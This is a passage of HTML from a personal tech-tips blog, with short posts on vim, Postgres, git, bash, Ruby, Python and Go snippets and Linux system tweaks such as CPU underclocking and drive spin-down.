</span><span class="c"></span>  <span class="no">push</span>  <span class="no">offset</span> <span class="no">main</span>            <span class="c">; push address of main(argc, argv, envp)
</span><span class="c"></span>  <span class="no">call</span>  <span class="no">___libc_start_main</span>     <span class="c">; call __libc_start_main procedure
</span><span class="c"></span>  <span class="no">hlt</span>                          <span class="err">;</span> <span class="no">halt</span> <span class="no">program</span></code></pre></div><div class="highlight"><pre class="chroma"><code class="language-cpp" data-lang="cpp"> <span class="kt">int</span> <span class="nf">__libc_start_main</span><span class="p">(</span> 
    <span class="kt">int</span> <span class="p">(</span><span class="o">*</span><span class="n">main</span><span class="p">)</span> <span class="p">(</span><span class="kt">int</span><span class="p">,</span> <span class="kt">char</span><span class="o">**</span><span class="p">,</span> <span class="kt">char</span><span class="o">**</span><span class="p">),</span>
    <span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> 
    <span class="kt">char</span> <span class="o">**</span><span class="n">ubp_av</span><span class="p">,</span>
    <span class="kt">void</span> <span class="p">(</span><span class="o">*</span><span class="n">init</span><span class="p">)</span> <span class="p">(</span><span class="kt">void</span><span class="p">),</span>
    <span class="kt">void</span> <span class="p">(</span><span class="o">*</span><span class="n">fini</span><span class="p">)</span> <span class="p">(</span><span class="kt">void</span><span class="p">),</span>
    <span class="kt">void</span> <span class="p">(</span><span class="o">*</span><span class="n">rtld_fini</span><span class="p">)</span> <span class="p">(</span><span class="kt">void</span><span class="p">),</span>
    <span class="kt">void</span> <span class="p">(</span><span class="o">*</span> <span class="n">stack_end</span><span class="p">)</span> <span class="p">);</span></code></pre></div>
<p>[1]: <code>push eax</code> is junk; only added to align to 8 arguments; never used.</p>

<p>For a more thorough and friendly explanation see this article:</p>

<p><a href="http://dbp-consulting.com/tutorials/debugging/linuxProgramStartup.html">Linux x86 Program Start Up or - How the heck do we get to main()?</a>.</p>

    </article>
  
    <article>
      <h2><a href="//warrick.io/posts/underclock-a-hot-processor/">underclock a hot processor</a></h2>
      <time>Oct 13, 2014</time>
      <p>I have a 125 watt processor that runs hot and overheats under heavy loads. Yeah
it is a bit dusty. As a stopgap, until I get around to ordering a proper fan, I
found a simple way to underclock the CPUs to keep it a bit cooler.</p>
<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">sudo apt-get install cpufrequtils

<span class="k">for</span> cpu in <span class="o">{</span><span class="m">0</span>..3<span class="o">}</span><span class="p">;</span> <span class="k">do</span>
  sudo cpufreq-set -g userspace -c <span class="nv">$cpu</span>
  sudo cpufreq-set -u <span class="m">2</span>.20Ghz -c <span class="nv">$cpu</span>
<span class="k">done</span></code></pre></div>
<p>You can check the available <code>governors</code> and current configuration with the
<code>cpufreq-info</code> command:</p>
<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">cpufreq-info

...
analyzing CPU <span class="m">3</span>:
  driver: acpi-cpufreq
  CPUs which run at the same hardware frequency: <span class="m">3</span>
  CPUs which need to have their frequency coordinated by software: <span class="m">3</span>
  maximum transition latency: <span class="m">4</span>.0 us.
  hardware limits: <span class="m">800</span> MHz - <span class="m">3</span>.40 GHz
  available frequency steps: <span class="m">3</span>.40 GHz, <span class="m">2</span>.70 GHz, <span class="m">2</span>.20 GHz, <span class="m">800</span> MHz
  available cpufreq governors: conservative, ondemand, userspace, powersave, performance
  current policy: frequency should be within <span class="m">800</span> MHz and <span class="m">3</span>.40 GHz.
                  The governor <span class="s2">&#34;userspace&#34;</span> may decide which speed to use
                  within this range.
  current CPU frequency is <span class="m">2</span>.20 GHz.</code></pre></div>
    </article>
  
    <article>
      <h2><a href="//warrick.io/posts/vim-newline-before-pattern/">vim insert before pattern</a></h2>
      <time>Oct 2, 2014</time>
      <p>Inserting a newline before lines matching a pattern, e.g. before comments #:</p>
<div class="highlight"><pre class="chroma"><code class="language-vim" data-lang="vim"><span class="p">:</span><span class="nx">g</span><span class="sr">/^#/</span><span class="nx">norm</span> <span class="nx">O</span></code></pre></div>
<p><a href="http://stackoverflow.com/a/2673266/255528">http://stackoverflow.com/a/2673266/255528</a></p>

    </article>
  
    <article>
      <h2><a href="//warrick.io/posts/vim-buffers-to-tabs/">open all vim buffers in tabs</a></h2>
      <time>Sep 17, 2014</time>
      <div class="highlight"><pre class="chroma"><code class="language-vim" data-lang="vim"><span class="p">:</span><span class="nx">bufdo</span> <span class="nx">tab</span> <span class="nx">split</span></code></pre></div>
    </article>
  
    <article>
      <h2><a href="//warrick.io/posts/find-duplicate-files/">find duplicate files</a></h2>
      <time>Jun 19, 2014</time>
      <p>Find duplicate files first by file size and then MD5 sum, with a progress bar:</p>
<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">find -not -empty -type f -printf <span class="s2">&#34;%s\n&#34;</span> <span class="se">\
</span><span class="se"></span>  <span class="p">|</span> sort -rn <span class="se">\
</span><span class="se"></span>  <span class="p">|</span> uniq -d <span class="se">\
</span><span class="se"></span>  <span class="p">|</span> xargs -I<span class="o">{}</span> -n1 find -type f -size <span class="o">{}</span>c -print0 <span class="se">\
</span><span class="se"></span>  <span class="p">|</span> tee <span class="se">\
</span><span class="se"></span>  <span class="p">|</span> pv --line-mode --size <span class="k">$(</span>find . -type f <span class="p">|</span> wc -l<span class="k">)</span> <span class="se">\
</span><span class="se"></span>  <span class="p">|</span> xargs -0 md5sum <span class="se">\
</span><span class="se"></span>  <span class="p">|</span> sort <span class="se">\
</span><span class="se"></span>  <span class="p">|</span> uniq -w32 --all-repeated<span class="o">=</span>separate <span class="se">\
</span><span class="se"></span>  <span class="p">|</span> tee /tmp/duplicates</code></pre></div>
<p><a href="http://www.commandlinefu.com/commands/view/3555/find-duplicate-files-based-on-size-first-then-md5-hash">http://www.commandlinefu.com/commands/view/3555/find-duplicate-files-based-on-size-first-then-md5-hash</a></p>

    </article>
  
    <article>
      <h2><a href="//warrick.io/posts/spin-down-idle-hard-drive/">spin down idle hard drive</a></h2>
      <time>May 23, 2014</time>
      <p>I noticed that my external hard drive, which uses a cheap SATA to USB
enclosure, was constantly spinning, even when I hadn&rsquo;t accessed it in hours.</p>

<p>I decided to lookup how to coax the drive to spin down.</p>

<p>A little searching showed that you can check a drive&rsquo;s status and set its idle
timeout policy with the <code>hdparm</code> command.</p>
<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">$ sudo hdparm -C /dev/sdb
/dev/sdb:
 drive state is:  active/idle</code></pre></div>
<p>Setting the timeout is a little odd, the value <code>120</code> means 10 minutes. See the
man page for details.</p>
<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">$ sudo hdparm -S <span class="m">120</span> /dev/sdb 
/dev/sda:
 setting standby to <span class="m">120</span> <span class="o">(</span><span class="m">10</span> minutes<span class="o">)</span></code></pre></div>
<p>I also read that some drives don&rsquo;t obey hdparm, so you may want to checkout
<code>hd-idle</code> if your drive won&rsquo;t idle.</p>

    </article>
  
    <article>
      <h2><a href="//warrick.io/posts/postgres-histogram/">postgres histogram</a></h2>
      <time>May 22, 2014</time>
      <p>A huge thank you for this little gem &mdash; a quick and dirty histogram in
PostgreSQL:</p>
<div class="highlight"><pre class="chroma"><code class="language-sql" data-lang="sql"><span class="k">WITH</span> 
<span class="n">stats</span> <span class="k">AS</span> <span class="p">(</span>
  <span class="k">SELECT</span> 
      <span class="k">min</span><span class="p">(</span><span class="n">__value__</span><span class="p">)</span>
    <span class="p">,</span> <span class="k">max</span><span class="p">(</span><span class="n">__value__</span><span class="p">)</span>
  <span class="k">FROM</span> <span class="n">__table__</span>
<span class="p">),</span> 
<span class="n">histogram</span> <span class="k">AS</span> <span class="p">(</span>
  <span class="k">SELECT</span>
    <span class="n">WIDTH_BUCKET</span><span class="p">(</span><span class="n">__value__</span><span class="p">,</span> <span class="k">min</span><span class="p">,</span> <span class="k">max</span><span class="p">,</span> <span class="mi">9</span><span class="p">)</span>  <span class="c1">--&lt;&lt;&lt;&lt;&lt;
</span><span class="c1"></span>    <span class="k">AS</span> <span class="n">bucket</span>
  <span class="p">,</span> <span class="k">MIN</span><span class="p">(</span><span class="n">__value__</span><span class="p">)</span>
  <span class="p">,</span> <span class="k">MAX</span><span class="p">(</span><span class="n">__value__</span><span class="p">)</span>
  <span class="p">,</span> <span class="k">COUNT</span><span class="p">(</span><span class="o">*</span><span class="p">)</span> 
    <span class="k">AS</span> <span class="n">freq</span>
  <span class="k">FROM</span> <span class="n">__table__</span>
  <span class="k">CROSS</span> <span class="k">JOIN</span> <span class="n">stats</span>
  <span class="k">GROUP</span> <span class="k">BY</span> <span class="n">bucket</span>
  <span class="k">ORDER</span> <span class="k">BY</span> <span class="n">bucket</span>
<span class="p">)</span>
<span class="k">SELECT</span> 
    <span class="n">bucket</span>
  <span class="p">,</span> <span class="k">min</span>
  <span class="p">,</span> <span class="k">max</span>
  <span class="p">,</span> <span class="n">freq</span>
  <span class="p">,</span> <span class="n">REPEAT</span><span class="p">(</span><span class="s1">&#39;*&#39;</span><span class="p">,</span> <span class="p">(</span><span class="n">freq</span><span class="p">::</span><span class="nb">FLOAT</span> <span class="o">/</span> <span class="k">max</span><span class="p">(</span><span class="n">freq</span><span class="p">)</span> <span class="n">over</span><span class="p">()</span> <span class="o">*</span> <span class="mi">30</span><span class="p">)::</span><span class="nb">INT</span><span class="p">)</span> 
    <span class="k">AS</span> <span class="n">bar</span>
<span class="k">FROM</span> <span class="n">histogram</span>
<span class="p">;</span></code></pre></div><div class="highlight"><pre class="chroma"><code class="language-txt" data-lang="txt"> bucket |  min  |  max  |  freq  |              bar
--------+-------+-------+--------+--------------------------------
      1 |     0 |  8517 | 294826 | ******************************
      2 |  8577 | 16400 |  73992 | ********
      3 | 17563 | 25200 |   8202 | *
      4 | 26219 | 33651 |    853 |
      5 | 34560 | 42600 |   1312 |
      6 | 43200 | 51063 |   2592 |
      7 | 53104 | 59037 |      9 |
      8 | 60000 | 68400 |     17 |
      9 | 68577 | 76833 |     54 |
     10 | 77060 | 85499 |     60 |</code></pre></div>
<p>Visualize the frequency distribution of some <code>__value__</code> in your <code>__table__</code>,
and adjust the number of buckets to increase the resolution.</p>

<p><a href="http://tapoueh.org/blog/2014/02/21-PostgreSQL-histogram.html">http://tapoueh.org/blog/2014/02/21-PostgreSQL-histogram.html</a></p>

    </article>
  
    <article>
      <h2><a href="//warrick.io/posts/mac-dont-save/">don&#39;t save shortcut</a></h2>
      <time>May 20, 2014</time>
      <p><img src="/img/dont-save-dialog.png" alt="dont save dialog"/></p>

<p>Seven years I have been using Mac OS X, and this entire time I have hated
moving my hand to the mouse to select the &ldquo;Don&rsquo;t Save&rdquo; button on exit dialog
menus.</p>

<p>Well, I finally looked up the shortcut and then I promptly forgot it. This
time, I am writing it down. Here it is, and I hope it helps.</p>

<p><strong>Command-D</strong></p>

<pre><code>Selects &quot;Don't Save&quot; in dialogs that contain a Don't Save button, in Mac OS X v10.6.8 and earlier
</code></pre>

<p><strong>Command-Delete</strong></p>

<pre><code>Selects &quot;Don't Save&quot; in dialogs that contain a Don't Save button, in OS X Lion and Mountain Lion
</code></pre>

<p><a href="http://support.apple.com/kb/ht1343">http://support.apple.com/kb/ht1343</a></p>

    </article>
  
    <article>
      <h2><a href="//warrick.io/posts/git-sparse-checkout/">git sparse checkout</a></h2>
      <time>Apr 23, 2014</time>
      <p>One thing I missed after switching to <code>git</code> from <code>svn</code> was the ability to
checkout a single directory.</p>

<p>Well, it seems that the ability to partially checkout a repository was added to
git in February of 2012, and I am way behind.</p>

<p>Here is how you perform a <strong>sparse checkout</strong>:</p>
<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash"><span class="c1"># Initialize
</span><span class="c1"></span>git init <span class="o">[</span>repo<span class="o">]</span>
<span class="nb">cd</span> <span class="o">[</span>repo<span class="o">]</span>

<span class="c1"># Fetch 
</span><span class="c1"></span>git remote add -f origin <span class="o">[</span>url<span class="o">]</span>

<span class="c1"># Configure
</span><span class="c1"></span>git config core.sparsecheckout <span class="nb">true</span>
<span class="nb">echo</span> <span class="s2">&#34;path/to/dir&#34;</span> &gt;&gt; .git/info/sparse-checkout
<span class="nb">echo</span> <span class="s2">&#34;path/to/some/file&#34;</span> &gt;&gt; .git/info/sparse-checkout

<span class="c1"># Checkout
</span><span class="c1"></span>git pull origin master</code></pre></div>
<p>If you modify <code>.git/info/sparse-checkout</code>, you will want to run the following
to update your working directory:</p>
<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">git read-tree -m -u HEAD</code></pre></div>
<p><a href="http://git-scm.com/docs/git-read-tree">http://git-scm.com/docs/git-read-tree</a><br />
<a href="http://stackoverflow.com/questions/600079/is-there-any-way-to-clone-a-git-repositorys-sub-directory-only">http://stackoverflow.com/questions/600079/is-there-any-way-to-clone-a-git-repositorys-sub-directory-only</a></p>

    </article>
  
    <article>
      <h2><a href="//warrick.io/posts/partial-uniq-with-lru-cache/">partial uniq using a lru cache</a></h2>
      <time>Apr 2, 2014</time>
      <p>Recently, I was faced with the challenge of removing duplicate lines from a
number of large data files.</p>

<p>Typically, I use a combination or <code>sort</code> and <code>uniq</code> or just <code>sort -u</code>, but in
this circumstance many duplicate lines were close together.</p>

<p>I found that, first, partially filtering duplicates by using a LRU cache to
keep track of and omit recently seen lines doubled the speed.</p>
<div class="highlight"><pre class="chroma"><code class="language-python" data-lang="python"><span class="ch">#!/usr/bin/env python</span>
<span class="c1"># file: lru-uniq.py</span>
<span class="kn">import</span> <span class="nn">fileinput</span>
<span class="kn">from</span> <span class="nn">repoze.lru</span> <span class="kn">import</span> <span class="n">LRUCache</span>

<span class="n">size</span> <span class="o">=</span> <span class="mi">10000</span>
<span class="n">cache</span> <span class="o">=</span> <span class="n">LRUCache</span><span class="p">(</span><span class="n">size</span><span class="p">)</span>
<span class="k">for</span> <span class="n">line</span> <span class="ow">in</span> <span class="n">fileinput</span><span class="o">.</span><span class="nb">input</span><span class="p">():</span>
  <span class="k">if</span> <span class="ow">not</span> <span class="n">cache</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">line</span><span class="p">):</span>
    <span class="k">print</span> <span class="n">line</span><span class="p">,</span>
  <span class="n">cache</span><span class="o">.</span><span class="n">put</span><span class="p">(</span><span class="n">line</span><span class="p">,</span> <span class="bp">True</span><span class="p">)</span></code></pre></div><div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">$ <span class="nb">time</span> sort ns <span class="p">|</span> uniq <span class="p">|</span> wc -l
  <span class="m">936442</span>
real	1m58.768s

$ <span class="nb">time</span> ./lru-uniq.py ns <span class="p">|</span> sort <span class="p">|</span> uniq <span class="p">|</span> wc -l
  <span class="m">936442</span>
real	0m55.236s</code></pre></div>
<p>I wanted to speed it up a little more, and it turns out that although I have
never written a program in Go before it was the fastest way to write a compiled
version.</p>

<p>So, here it is, and I&rsquo;m sure it is terrible Go.</p>
<div class="highlight"><pre class="chroma"><code class="language-go" data-lang="go"><span class="kn">package</span> <span class="nx">main</span>

<span class="kn">import</span> <span class="p">(</span>
  <span class="s">&#34;os&#34;</span>
  <span class="s">&#34;fmt&#34;</span>
  <span class="s">&#34;bufio&#34;</span>
  <span class="s">&#34;github.com/golang/groupcache/lru&#34;</span>
<span class="p">)</span>

<span class="kd">func</span> <span class="nx">main</span><span class="p">()</span> <span class="p">{</span>
  <span class="nx">cache</span> <span class="o">:=</span> <span class="nx">lru</span><span class="p">.</span><span class="nx">New</span><span class="p">(</span><span class="mi">10000</span><span class="p">)</span>
  <span class="nx">stdin</span> <span class="o">:=</span> <span class="nx">bufio</span><span class="p">.</span><span class="nx">NewReader</span><span class="p">(</span><span class="nx">os</span><span class="p">.</span><span class="nx">Stdin</span><span class="p">)</span>
  <span class="k">for</span> <span class="p">{</span>
    <span class="nx">line</span><span class="p">,</span> <span class="nx">err</span> <span class="o">:=</span> <span class="nx">stdin</span><span class="p">.</span><span class="nx">ReadString</span><span class="p">(</span><span class="sc">&#39;\n&#39;</span><span class="p">)</span>
    <span class="k">if</span> <span class="nx">err</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
      <span class="k">break</span>
    <span class="p">}</span>
    <span class="nx">_</span><span class="p">,</span> <span class="nx">hit</span> <span class="o">:=</span> <span class="nx">cache</span><span class="p">.</span><span class="nx">Get</span><span class="p">(</span><span class="nx">line</span><span class="p">)</span>
    <span class="k">if</span> <span class="p">!</span><span class="nx">hit</span> <span class="p">{</span>
      <span class="nx">fmt</span><span class="p">.</span><span class="nx">Print</span><span class="p">(</span><span class="nx">line</span><span class="p">)</span>
    <span class="p">}</span>
    <span class="nx">cache</span><span class="p">.</span><span class="nx">Add</span><span class="p">(</span><span class="nx">line</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span> 
  <span class="p">}</span>
<span class="p">}</span></code></pre></div><div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">$ <span class="nb">time</span> ./lru-uniq &lt; ns <span class="p">|</span> sort <span class="p">|</span> uniq <span class="p">|</span> wc -l
  <span class="m">936442</span>
real	0m35.218s</code></pre></div>
    </article>
  
    <article>
      <h2><a href="//warrick.io/posts/useful-ruby-switches/">useful ruby switches</a></h2>
      <time>Mar 27, 2014</time>
      <p>Ruby is excellent for writing one-off scripts, and there are a lot of extremely
useful flags for integrating Ruby into pipelines.</p>
<div class="highlight"><pre class="chroma"><code class="language-txt" data-lang="txt">-n   Iterate over input file; automatically wraps script in:
            while gets
              ...
            end
-a   Turns on auto-split mode when used with -n or -p. Executes 
            $F = $_.split
     at beginning of each loop.

-l   Automatically .chops! line read, removing trailing \r and \n bytes.

-F   Specifies input field separator; use -a, access fields with $F.</code></pre></div>
<p>Dummy example prints the first field of a csv:</p>
<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash"><span class="c1"># cut -d, -f1
</span><span class="c1"></span>ruby -anl -F, -e <span class="s2">&#34;puts </span><span class="nv">$F</span><span class="s2">[0]&#34;</span> &lt; input.csv</code></pre></div>
<p>Integrates a one-liner into a pipeline, which searches a csv for entries on a
certain date:</p>
<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash"><span class="c1"># print first and second field, converting timestamp to YYYYMMDD
</span><span class="c1"></span>pv data.csv.tar.xz <span class="se">\
</span><span class="se"></span>  <span class="p">|</span> xzip <span class="se">\
</span><span class="se"></span>  <span class="p">|</span> ruby -r <span class="nb">time</span> -anl -F, -e <span class="se">\
</span><span class="se"></span>    <span class="s1">&#39;puts &#34;#{$F[0]},#{Time.at($F[1].to_i).strftime(&#34;%Y%m%d&#34;)}&#34;&#39;</span> <span class="se">\
</span><span class="se"></span>  <span class="p">|</span> <span class="nv">LC_ALL</span><span class="o">=</span>C fgrep <span class="m">20140331</span> <span class="se">\
</span><span class="se"></span>  &gt; output</code></pre></div>
<p>If your code is not one line, you can use the switches in your shebang:</p>

<pre><code>#!/usr/bin/env ruby -a -n -l -i -F,
</code></pre>

<p>Inspired by the following post about refactoring a 47-line script into just a
single line with the help of these switches.</p>

<p><a href="http://arjanvandergaag.nl/blog/using-ruby-command-line-options.html">http://arjanvandergaag.nl/blog/using-ruby-command-line-options.html</a></p>

    </article>
  
    <article>
      <h2><a href="//warrick.io/posts/vim-reselect-visual-block/">reselect visual block in vim</a></h2>
      <time>Mar 24, 2014</time>
      <p>I try to minimize visual block usage in favor of gestures, but for whatever
reason I have been neglecting a very important shortcut for reselecting the
previously selected text.</p>
<div class="highlight"><pre class="chroma"><code class="language-txt" data-lang="txt">gv</code></pre></div>
    </article>
  
    <article>
      <h2><a href="//warrick.io/posts/psql-editor-highlighting/">syntax highlighting in psql vim session</a></h2>
      <time>Mar 23, 2014</time>
      <p>If you spend a lot of time using <code>psql</code>, you should definitely use the <code>\e</code> and
<code>\ef</code> commands to edit queries and functions in VIM.</p>
<div class="highlight"><pre class="chroma"><code class="language-txt" data-lang="txt">\e [FILE] [LINE]  edit the query buffer (or file) with external editor 
\ef [FUNCNAME [LINE]]  edit function definition with external editor</code></pre></div>
<p>One annoyance is that, because the temporary file created doesn&rsquo;t have a <code>.sql</code>
extension, VIM doesn&rsquo;t enable syntax highlighting.</p>

<p>Here is a simple autocmd that will turn syntax highlighting on that match
psql&rsquo;s filename pattern:</p>
<div class="highlight"><pre class="chroma"><code class="language-vim" data-lang="vim"><span class="nx">autocmd</span> <span class="nx">BufRead</span> <span class="sr">/tmp/</span><span class="nx">psql</span>.<span class="nx">edit</span>.* <span class="nx">setlocal</span> <span class="nx">ft</span><span class="p">=</span><span class="nx">sql</span></code></pre></div>
    </article>
  
    <article>
      <h2><a href="//warrick.io/posts/vim-soft-wrapping/">soft wrapping in vim</a></h2>
      <time>Mar 22, 2014</time>
      <p>By default, <code>wrap</code> in VIM will break lines in the middle of words.</p>

<p>To enable soft wrapping, wrapping without breaking words, simply enable
<code>linebreak</code>.</p>
<div class="highlight"><pre class="chroma"><code class="language-vim" data-lang="vim"><span class="p">:</span><span class="nx">set</span> <span class="nx">wrap</span><span class="err">
</span><span class="err"></span><span class="p">:</span><span class="nx">set</span> <span class="nx">linebreak</span></code></pre></div>
<p><a href="http://vimcasts.org/episodes/soft-wrapping-text/">http://vimcasts.org/episodes/soft-wrapping-text/</a></p>

    </article>
  
    <article>
      <h2><a href="//warrick.io/posts/fix-ssh-logins-v2/">fix slow ssh logins v2</a></h2>
      <time>Mar 17, 2014</time>
      <p>Newer versions of OpenSSH attempt to reverse resolve client IP addresses. This
can cause slow ssh connections if the client IP does not reverse resolve as the
DNS request will be attempted multiple times and timeout each time.</p>

<p>To fix the problem, disable it in your <code>/etc/ssh/sshd_config</code>:</p>
<div class="highlight"><pre class="chroma"><code class="language-txt" data-lang="txt">  UseDNS no</code></pre></div>
    </article>
  
    <article>
      <h2><a href="//warrick.io/posts/trap-to-cleanup/">trap to cleanup</a></h2>
      <time>Jan 20, 2014</time>
      <div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash"><span class="k">function</span> cleanup<span class="o">()</span> <span class="o">{</span>
 rm -v <span class="nv">$TEMPFILE</span>
<span class="o">}</span>

<span class="c1"># catch HUP, INT, QUIT, and TERM
</span><span class="c1"></span><span class="nb">trap</span> cleanup <span class="m">1</span> <span class="m">2</span> <span class="m">3</span> <span class="m">15</span></code></pre></div>
    </article>
  
    <article>
      <h2><a href="//warrick.io/posts/vim-tips-day-01/">vim tips day 01</a></h2>
      <time>Jan 15, 2014</time>
      <p>Started reading <em>Practical Vim</em> and I&rsquo;m going to start listing tips I
should be using more frequently in VIM.</p>
<div class="highlight"><pre class="chroma"><code class="language-txt" data-lang="txt">zz                  redraw screen with current line in middle 
CTRL-o              execute one command, return to Insert mode
CTRL-r {register}   paste from register while in Insert mode 
CTRL-r=             use the expression register to evaluate and 
                    insert a calculation           
q:                  command-line window</code></pre></div>
    </article>
  
    <article>
      <h2><a href="//warrick.io/posts/postgres-dblink/">postgres dblink</a></h2>
      <time>Dec 4, 2013</time>
      <p>Connect to and query a remote PostgreSQL database from a local database.</p>

<p>First install the dblink extension and enable it for your database, e.g.</p>
<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">sudo apt-get install postgresql-contrib-9.1
sudo -u postgres psql -c <span class="s1">&#39;CREATE EXTENSION dblink;&#39;</span> foo</code></pre></div>
<p>Then connect to the remote database with the dblink_connect function:</p>
<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">SELECT 
dblink_connect<span class="o">(</span><span class="s1">&#39;hostaddr=10.0.1.1 port=5432 dbname=foo user=bar password=baz&#39;</span><span class="o">)</span><span class="p">;</span></code></pre></div>
<p><a href="http://www.postgresql.org/docs/9.1/static/contrib-dblink-connect.html">http://www.postgresql.org/docs/9.1/static/contrib-dblink-connect.html</a></p>

    </article>
  
    <article>
      <h2><a href="//warrick.io/posts/kill-postgres-query/">kill postgres query</a></h2>
      <time>Oct 29, 2013</time>
      <p>Find the PID of the query from a system utility like top or htop, or from the
&ldquo;pg_catalog.pg_stat_activity&rdquo; table.</p>
<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">sudo -u postgres psql </code></pre></div><div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash"><span class="nv">postgres</span><span class="o">=</span># SELECT pg_cancel_backend<span class="o">(</span><span class="m">28710</span><span class="o">)</span><span class="p">;</span></code></pre></div>
    </article>
  
    <article>
      <h2><a href="//warrick.io/posts/pam-exec/">pam exec</a></h2>
      <time>Oct 29, 2013</time>
      <p>PAM, the Linux Pluggable Authentication Modules, allows you to execute programs
and scripts when SSH sessions are opened and closed.</p>
<div class="highlight"><pre class="chroma"><code class="language-txt" data-lang="txt"># /etc/pam.d/sshd
session optional        pam_exec.so     /path/to/script.sh</code></pre></div><div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash"><span class="c1"># /path/to/script.sh
</span><span class="c1"></span>
<span class="cp">#!/bin/bash
</span><span class="cp"></span><span class="k">if</span> <span class="o">[</span> <span class="nv">$PAM_TYPE</span> <span class="o">=</span> <span class="s2">&#34;open_session&#34;</span> <span class="o">]</span><span class="p">;</span> <span class="k">then</span>
  <span class="c1"># 
</span><span class="c1"></span><span class="k">fi</span>
<span class="nb">exit</span> <span class="m">0</span></code></pre></div>
<p><strong>WARNING:</strong><br />
Botching your script or failing to return 0 will cause SSH login
to fail. Don&rsquo;t lock yourself out, test your script!</p>

    </article>
  
    <article>
      <h2><a href="//warrick.io/posts/python-in-postgres/">python in postgres</a></h2>
      <time>Oct 19, 2013</time>
      <p>Installing and adding Python to your PostgreSQL database in Ubuntu:</p>
<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">sudo apt-get install postgresql-plpython-9.1
sudo -u postgres psql -c <span class="s1">&#39;CREATE EXTENSION plpythonu;&#39;</span> dbname</code></pre></div>
<p>Check that it was installed:</p>
<div class="highlight"><pre class="chroma"><code class="language-psql" data-lang="psql">psql -c &#39;\dL&#39; dbname
       List of languages
   Name    |  Owner   | Trusted 
-----------+----------+---------
 plpgsql   | postgres | t 
 plpythonu | postgres | f 
(2 rows)</code></pre></div>
<p>Keep in mind that Python is an &lsquo;untrusted&rsquo; language meaning that functions
written in PL/Pythonu execute in an administrative context. For this reason,
Python functions can only be created by an administrator and special care
should be taken that nothing damaging or nefarious can be done with the
function by non administrator users of the database.</p>

<p>Now, you can declare a function in Python as an administrator.</p>
<div class="highlight"><pre class="chroma"><code class="language-sql" data-lang="sql"><span class="k">CREATE</span> <span class="k">FUNCTION</span> <span class="n">shuffle</span><span class="p">(</span><span class="n">arg</span> <span class="nb">text</span><span class="p">)</span> <span class="k">RETURNS</span> <span class="nb">text</span> <span class="k">AS</span>
<span class="err">$$</span>
  <span class="n">import</span> <span class="n">random</span>
  <span class="n">a</span> <span class="o">=</span> <span class="n">list</span><span class="p">(</span><span class="n">arg</span><span class="p">)</span>
  <span class="n">random</span><span class="p">.</span><span class="n">shuffle</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
  <span class="k">return</span> <span class="s1">&#39;&#39;</span><span class="p">.</span><span class="k">join</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
<span class="err">$$</span>
<span class="k">LANGUAGE</span> <span class="n">plpythonu</span><span class="p">;</span></code></pre></div><div class="highlight"><pre class="chroma"><code class="language-psql" data-lang="psql">=&gt; SELECT shuffle(&#39;foo bar&#39;);
 shuffle 
---------
 oa forb
(1 row)</code></pre></div>
    </article>
  
    <article>
      <h2><a href="//warrick.io/posts/consumer-decorator/">consumer decorator</a></h2>
      <time>Oct 18, 2013</time>
      <p>Just stumbled across this little gem, and I don&rsquo;t want to forget about it. Here
is a decorator that takes care of the ugliness in first call to <code>.next()</code>,
necessary for receiving coroutines in Python.</p>
<div class="highlight"><pre class="chroma"><code class="language-python" data-lang="python"><span class="k">def</span> <span class="nf">consumer</span><span class="p">(</span><span class="n">func</span><span class="p">):</span>
  <span class="k">def</span> <span class="nf">start</span><span class="p">(</span><span class="o">*</span><span class="n">args</span><span class="p">,</span><span class="o">**</span><span class="n">kwargs</span><span class="p">):</span>
  <span class="n">c</span> <span class="o">=</span> <span class="n">func</span><span class="p">(</span><span class="o">*</span><span class="n">args</span><span class="p">,</span><span class="o">**</span><span class="n">kwargs</span><span class="p">)</span>
  <span class="n">c</span><span class="o">.</span><span class="nb">next</span><span class="p">()</span>
  <span class="k">return</span> <span class="n">c</span>
  <span class="k">return</span> <span class="n">start</span></code></pre></div><div class="highlight"><pre class="chroma"><code class="language-python" data-lang="python"><span class="nd">@consumer</span>
<span class="k">def</span> <span class="nf">recv_count</span><span class="p">():</span>
 <span class="k">try</span><span class="p">:</span>
   <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
     <span class="n">n</span> <span class="o">=</span> <span class="p">(</span><span class="k">yield</span><span class="p">)</span> <span class="c1"># Yield expression</span>
     <span class="k">print</span> <span class="sa"></span><span class="s2">&#34;T-minus&#34;</span><span class="p">,</span> <span class="n">n</span>
 <span class="k">except</span> <span class="ne">GeneratorExit</span><span class="p">:</span>
   <span class="k">print</span> <span class="sa"></span><span class="s2">&#34;Kaboom!&#34;</span></code></pre></div>
<p><a href="http://www.dabeaz.com/coroutines/Coroutines.pdf">http://www.dabeaz.com/coroutines/Coroutines.pdf</a></p>

    </article>
  
    <article>
      <h2><a href="//warrick.io/posts/piping-to-ruby-scripts/">piping to ruby scripts</a></h2>
      <time>Oct 16, 2013</time>
      <p>Ruby, instead of exiting when it receives a SIGPIPE, throws an exception
Errno:EPIPE which usually results in a stack trace.</p>
<div class="highlight"><pre class="chroma"><code class="language-txt" data-lang="txt">./foo.rb:8:in `write&#39;: Broken pipe - &lt;STDOUT&gt; (Errno::EPIPE)</code></pre></div>
<p>Here is the idiomatic one-line to simply exit when your script gets a SIGPIPE:</p>
